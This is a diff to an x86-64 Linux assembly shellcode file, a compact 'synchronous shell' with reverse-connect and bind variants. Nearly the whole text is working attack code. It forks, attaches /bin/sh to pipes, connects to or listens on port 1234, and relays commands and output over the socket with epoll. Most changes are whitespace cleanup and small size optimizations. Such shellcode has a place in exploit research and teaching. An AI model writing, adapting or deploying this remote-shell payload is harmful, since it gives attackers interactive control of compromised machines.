@@ -26,30 +26,30 @@
 ;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
-;  
-; -----------------------------------------------
-; Synchronous shell for Linux/amd64
 ;
-; 348 bytes for connect
-; 367 bytes for bind
+; -----------------------------------------------
+; Synchronous shell for Linux/AMD64
+;
+; 344 bytes for connect
+; 363 bytes for bind
 ;
 ; -----------------------------------------------
 
       %define AMD64
       %include "include.inc"
- 
+
       %ifndef BIN
-        global main
-      %endif     
-           
+        global _start
+      %endif
+
       bits 64
-    
-main:
+
+_start:
       push    rbp
       push    rbx
       push    rsi
       push    rdi
-      
+
       xor     eax, eax
       cdq
       mov     al, ds_tbl_size
@@ -58,39 +58,39 @@ main:
       pop     rbp
       ; create 2 read/write pipes
       push    rbp
-      pop     rdi   
-      
+      pop     rdi
+
       ; pipe(in);
-      mov     al, SYS_pipe    
+      mov     al, SYS_pipe
       syscall
       scasq
-      
+
       ; pipe(out);
       mov     al, SYS_pipe
-      syscall   
-      
+      syscall
+
       ; pid = fork();
       mov     al, SYS_fork
-      syscall    
+      syscall
       mov     [rbp+@pid], eax ; save pid
       test    eax, eax        ; already forked?
       jnz     opn_con         ; open connection
-      
+
       ; in this order..
       ;
-      ; dup2 (out[1], STDERR_FILENO)      
+      ; dup2 (out[1], STDERR_FILENO)
       ; dup2 (out[1], STDOUT_FILENO)
-      ; dup2 (in[0],  STDIN_FILENO )   
+      ; dup2 (in[0],  STDIN_FILENO )
       push    2                     ; esi = STDERR_FILENO
       pop     rsi
       mov     edi, [rbp+@out1]      ; edi = out[1]
 c_dup:
-      mov     al, SYS_dup2       
+      mov     al, SYS_dup2
       syscall
-      dec     rsi 
-      cmovz   edi, [rbp+@in0]       ; replace stdin with in[0]  
-      jns     c_dup  
-  
+      dec     rsi
+      cmovz   edi, [rbp+@in0]       ; replace stdin with in[0]
+      jns     c_dup
+
       ; close pipe handles in this order..
       ;
       ; close(in[0]);
@@ -99,16 +99,16 @@ c_dup:
       ; close(out[1]);
       push    rbp               ; rsi = p_in and p_out
       pop     rsi
-      mov     dl, 4     
+      mov     dl, 4
 cls_pipe:
       lodsd                    ; eax = pipes[i]
-      xchg    eax, edi   
+      xchg    eax, edi
       push    SYS_close
-      pop     rax 
+      pop     rax
       syscall
       dec     dl
-      jnz     cls_pipe      
-      
+      jnz     cls_pipe
+
       ; execve("/bin//sh", 0, 0);
       xor     esi, esi
       push    rdx
@@ -117,55 +117,55 @@ cls_pipe:
       mov     rcx, '/bin//sh'
       push    rcx
       push    rsp
-      pop     rdi    
+      pop     rdi
       mov     al, SYS_execve
       syscall
-opn_con:    
+opn_con:
       ; close(in[0]);
       push    SYS_close
       pop     rax
-      mov     edi, [rbp+@in0]    
-      syscall    
+      mov     edi, [rbp+@in0]
+      syscall
 
       ; close(out[1]);
-      mov     al, SYS_close     
-      mov     edi, [rbp+@out1]    
-      syscall   
-      
-      ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);     
+      mov     al, SYS_close
+      mov     edi, [rbp+@out1]
+      syscall
+
+      ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
       push    SYS_socket
       pop     rax
       push    SOCK_STREAM
       pop     rsi
       push    AF_INET
-      pop     rdi    
-      syscall 
+      pop     rdi
+      syscall
       mov     [rbp+@s], eax    ; save socket
-      
-      %ifdef BIND         
+
+      %ifdef BIND
         mov     edx, 0xd2040002 ; sa.sin_addr=INADDR_ANY
       %else
         mov     rdx, 0x0100007fd2040002 ; sa.sin_addr=127.0.0.1
       %endif
-      
+
       push    rdx
-      push    16                ; sizeof(sa)  
+      push    16                ; sizeof(sa)
       pop     rdx
       push    rsp               ; &sa
       pop     rsi
       xchg    eax, edi          ; edi = s
-%ifndef BIND  
-      ; connect (s, &sa, sizeof(sa)); 
+%ifndef BIND
+      ; connect (s, &sa, sizeof(sa));
       push    SYS_connect
       pop     rax
-      syscall    
+      syscall
       test    eax, eax
       pop     rcx
       jl      cls_sck
 %else
-      ; bind (s, &sa, sizeof(sa));   
+      ; bind (s, &sa, sizeof(sa));
       push    SYS_bind
-      pop     rax 
+      pop     rax
       syscall
       test    eax, eax
       pop     rcx
@@ -182,94 +182,94 @@ opn_con:
       syscall
       xchg    dword[rbp+@s ], eax       ; swap with s
       mov     dword[rbp+@s2], eax       ; save as s2
-%endif      
+%endif
       ; efd = epoll_create1(0);
       xor     edi, edi          ; sets CF=0
       push    SYS_epoll_create1
       pop     rax
       syscall
       mov     dword[rbp+@efd], eax                    ; save efd
-      
+
       xchg    eax, edi          ; edi = efd
-      mov     eax, [rbp+@s]       
+      mov     eax, [rbp+@s]     ; do socket first
 poll_init:
       ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts);
       lea     r10, [rbp+@evts]
-      mov     dword[r10+events], EPOLLIN
-      mov     dword[r10+data  ], eax ; evts.data.fd = i==0 ? s : out[0]
-      xchg    eax, edx
-      mov     al, SYS_epoll_ctl    
       push    EPOLL_CTL_ADD
       pop     rsi
+      mov     dword[r10+events], esi ; EPOLLIN
+      mov     dword[r10+data  ], eax ; evts.data.fd = i==0 ? s : out[0]
+      xchg    eax, edx
+      mov     al, SYS_epoll_ctl
       syscall
       mov     eax, [rbp+@out0]
       cmp     edx, eax  ; do out[0] in 2nd loop
-      jnz     poll_init      
-      ; now loop until user exits or some other error      
+      jnz     poll_init
+      ; now loop until user exits or some other error
 poll_wait:
       ; epoll_wait(efd, &evts, 1, -1);
       push    SYS_epoll_wait
       pop     rax
       mov     r10d, -1          ; no timeout
-      push    1                 ; edx = 1 event 
+      push    1                 ; edx = 1 event
       pop     rdx
       lea     rsi, [rbp+@evts]
       mov     edi, [rbp+@efd]
       syscall
-      
-      ; if (r <= 0) break;
-      test    eax, eax
-      jle     cls_efd
-      
-      lodsd                    ; eax = evt.events
+
+      ; if (r < 0) break;
+      test    al, al
+      js      cls_efd
+
+      lodsd                     ; eax = evt.events
       ; if (!(evts.events & EPOLLIN)) break;
-      dec     eax               ; test   al, EPOLLIN
+      dec     al                ; EPOLLIN = 1, EPOLLHUP = 16
       jnz     cls_efd
 
-      lodsd                    ; eax = evt.data.fd       
-      ; r=(fd==s)?s:out[0];
-      ; w=(fd==s)?in[1]:s;
+      lodsd                     ; eax = evt.data.fd
+      ; r = (fd == s) ? s     : out[0];
+      ; w = (fd == s) ? in[1] : s;
       xchg    edi, eax          ; ebx = evt.data.fd
       cmp     edi, [rbp+@s]     ; if socket event
       cmove   eax, [rbp+@in1]   ; write to in[1]
       cmovne  eax, [rbp+@s]     ; else read from out[0], write to s
       push    rax
-      
+
       ; read(r, buf, BUFSIZ);
       cdq                       ; rdx = BUFSIZ
       mov     dl, BUFSIZ
       lea     rsi, [rbp+@buf]   ; rsi = buf
       xor     eax, eax          ; rax = SYS_read
       syscall
-      
+
       ; encrypt/decrypt buffer
-      
+
       ; write(w, buf, len);
       xchg    eax, edx          ; edx = len
       pop     rdi               ; s or in[1]
       mov     al, SYS_write
       syscall
       jmp     poll_wait
-cls_efd:   
+cls_efd:
       ; epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);
       xor     r10, r10            ; NULL
       mov     edx, [rbp+@s]       ; s
-      push    EPOLL_CTL_DEL       
+      push    EPOLL_CTL_DEL
       pop     rsi
       mov     edi, [rbp+@efd]     ; efd
       push    SYS_epoll_ctl       ; epoll_ctl
       pop     rax
       syscall
-    
+
       ; epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);
       mov     edx, [rbp+@out0]    ; out[0]
       mov     al, SYS_epoll_ctl   ; epoll_ctl
-      syscall 
-      
+      syscall
+
       ; close(efd);
       mov     al, SYS_close
       syscall
-    
+
       ; shutdown socket
       ; shutdown(s, SHUT_RDWR);
       mov     al, SYS_shutdown
@@ -280,16 +280,16 @@ cls_efd:
 cls_sck:
       ; close(s);
       push    SYS_close
-      pop     rax   
+      pop     rax
       mov     edi, [rbp+@s]
-      syscall 
-    
+      syscall
+
 %ifdef BIND
       ; close(s1);
       mov     al, SYS_close
       mov     edi, [rbp+@s2]
       syscall
-%endif            
+%endif
       ; terminate /bin/sh
       ; kill(pid, SIGCHLD);
       mov     al, SYS_kill
@@ -299,15 +299,15 @@ cls_sck:
       syscall
 
       ; close(in[1]);
-      mov     al, SYS_close    
+      mov     al, SYS_close
       mov     edi, [rbp+@in1]
-      syscall   
+      syscall
 
       ; close(out[0]);
-      mov     al, SYS_close    
+      mov     al, SYS_close
       mov     edi, [rbp+@out0]
-      syscall 
-    
+      syscall
+
       ; only include exit system call
       ; if compiled as ELF
 %ifndef BIN
@@ -324,4 +324,3 @@ cls_sck:
       pop     rbp
       ret
 %endif
-      
